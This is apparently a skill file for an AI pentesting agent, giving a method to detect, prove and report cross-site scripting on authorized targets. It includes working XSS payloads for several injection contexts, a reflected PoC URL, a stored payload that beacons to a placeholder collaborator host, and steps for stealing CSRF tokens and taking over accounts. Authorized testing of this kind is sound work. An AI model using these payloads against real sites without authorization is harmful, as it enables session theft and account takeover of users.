---
name: xss
description: >-
  Detect, prove, and report cross-site scripting (XSS) on authorized targets with minimal safe PoC and impact-first triage.
  Use when you see reflected input echoed into an HTML/attribute/JavaScript/URL context, stored input on comments / profiles /
  display names / messages, or client-side DOM sinks (innerHTML, outerHTML, document.write, insertAdjacentHTML, eval, setTimeout,
  jQuery .html()) fed from sources like location, document.URL, document.referrer, postMessage. Covers reflected XSS, stored
  (persistent) XSS, DOM-based XSS, context breakouts, event-handler payloads, filter/WAF bypass, CSP-aware exploitation, polyglots,
  alert() vs real impact (session/CSRF-token theft, account takeover), and anti-self-XSS noise filtering.
---

# XSS (Cross-Site Scripting)

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


XSS lets injected JavaScript run in a victim's browser in the target's origin, breaking the same-origin boundary. Three kinds: **reflected** (payload in the request, echoed in the immediate response), **stored** (payload persisted server-side, served to other users later), **DOM-based** (client-side JS reads an attacker source and writes it to a dangerous sink — no server reflection needed).

## When to test
Test **every** input that can reach a response or the DOM:
- Every reflected sink: query/path params, form fields, request headers (Referer, User-Agent, custom), cookies if reflected.
- Every stored sink: comments, profile/display name, bio, messages, filenames, support tickets, log viewers, admin panels that render user data.
- Every DOM sink fed by `location.*`, `document.URL`, `document.referrer`, `document.cookie`, `window.name`, `postMessage` data.

## Impact & priority (honest)
- **High signal:** stored XSS rendered to other authenticated users (esp. admins / support agents / on a sensitive page), or any XSS chained to account takeover (CSRF-token read + email/password change). Report these.
- **Medium:** reflected/DOM XSS with a **viable delivery** (a clickable URL or a realistic source) firing in the victim's authenticated session.
- **NOISE — do not report:** self-XSS (victim must paste the payload into their own console/devtools), XSS that requires unrealistic victim action, or "reflection" in a context that never renders (JSON body with `Content-Type: application/json`, downloaded file, attribute that gets HTML-encoded). See "Don't report as noise".

## Detection
1. **Reflect a unique probe** that survives encoding triage, e.g. `wkr7q9z'"<>` — pick a random marker so you can grep responses/DOM unambiguously.
2. **Find every reflection** (server response body AND rendered DOM — use devtools Ctrl+F for DOM XSS).
3. **Identify the context** at each reflection: between tags, inside an attribute value, inside a `<script>` JS string/template literal, inside a URL/`href`, or inside a DOM sink.
4. **Check which of `' " < > / ` ${} \`** survive un-encoded. That dictates the breakout.
5. **Test a context-appropriate breakout** (see below + cheatsheet.md), then confirm execution **in a real browser**, not just Repeater.

## Exploitation (context breakouts)
- **Between HTML tags:** inject a tag that fires without interaction: `<svg onload=...>` / `<img src=x onerror=...>`. If `<script>` is allowed and not CSP-blocked, `<script>...</script>`.
- **In an attribute value:** if `>` allowed, break out `"><svg onload=...>`. If not, stay in-tag: `" autofocus onfocus=... x="`. In `href`/`src`: `javascript:...`.
- **In a JS string:** `'-alert(document.domain)-'` or `';alert(document.domain)//`. If `'` is backslash-escaped, neutralize with a leading `\`. Angle-bracket route: `</script><svg onload=...>`.
- **In a template literal:** `${alert(document.domain)}` — no need to close the string.
- **DOM sink:** for `innerHTML`/jQuery `.html()` use `<img src=x onerror=...>` (raw `<script>` won't run via innerHTML); for `document.write` a `<script>`/`<svg onload>` works; for `href`/`location` sinks use `javascript:`.

**Proving impact (go past `alert`):** `alert(document.domain)` only confirms execution and *which* origin. For a real report, demonstrate one of:
- **Session/CSRF-token theft:** read the anti-CSRF token from the page (`document.querySelector('input[name=csrf]').value`) and exfil to YOUR collaborator.
- **Account action:** auto-submit the email-change / add-2FA-device request using that token (this is what makes it ATO, and is why CSRF tokens don't stop XSS).
- **Cookie exfil** only if not `HttpOnly`; otherwise note HttpOnly and pivot to token/action proof.
- **CSP-aware:** if inline script is blocked, look for an allowed/wildcard source, a JSONP endpoint on an allowed host, or use an `img`/dangling-markup channel for exfil (see reference.md).

Always exfil to your **own collaborator** (e.g. Burst/interactsh/your domain). Never exfil real users' cookies or data.

## Contexts & bypasses (quick map)
| Context | Minimal breakout |
|---|---|
| Between tags | `<svg onload=alert(1)>` |
| Attribute (brackets ok) | `"><svg onload=alert(1)>` |
| Attribute (no brackets) | `" autofocus onfocus=alert(1) x="` |
| `href`/`src` | `javascript:alert(1)` |
| JS string | `'-alert(1)-'` / `';alert(1)//` |
| Template literal | `${alert(1)}` |
| DOM innerHTML | `<img src=x onerror=alert(1)>` |
Full payload tables, filter/WAF bypasses, polyglots, and framework (AngularJS/Vue) escapes: see **cheatsheet.md**.

## Minimal PoC (for ./_EXPLOIT/)
Log only PROVEN, fired XSS. Use a harmless marker (`print(document.domain)` via `alert`/`console.log`) for the fire-proof, and your **own** collaborator for any exfil. Examples:

Reflected (single clickable URL):
```
https://TARGET/search?q=%22%3E%3Csvg%20onload%3Dalert(document.domain)%3E
```

Stored (payload submitted to the field, fires when another user views it):
```
<img src=x onerror="new Image().src='https://YOUR-COLLAB/x?d='+document.domain">
```

Save to `./_EXPLOIT/xss-<target>-<location>.md` with: URL/request, exact payload, context, screenshot/text of the fired marker, and the impact step proven (token read / action). Keep it minimal and SAFE.

## Don't report as noise
- **Self-XSS:** requires the victim to paste into their own console or into a field only they see. Not a vuln unless chained to a real delivery (e.g. CSRF that auto-fills it).
- **Unrealistic victim action:** payload only fires after the victim performs steps no real user would.
- **Non-rendered reflection:** echoed in a JSON/`application/json` or `text/plain` response, a downloaded attachment, or a value that is HTML-entity-encoded on output. Confirm rendering in a browser before claiming XSS.
- **Bare `alert(1)` with no viable delivery or impact** on a low-value reflected sink — note it, but it is low signal.

## Deep reference
- `reference.md` — reflected/stored/DOM deep dive, all contexts, sources & sinks, exploitation (cookie caveats, password/auto-fill capture, CSRF/ATO chains, dangling markup), CSP basics & bypass directions, prevention.
- `cheatsheet.md` — payload tables mirroring PortSwigger's XSS cheat sheet.
- https://portswigger.net/web-security/cross-site-scripting
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
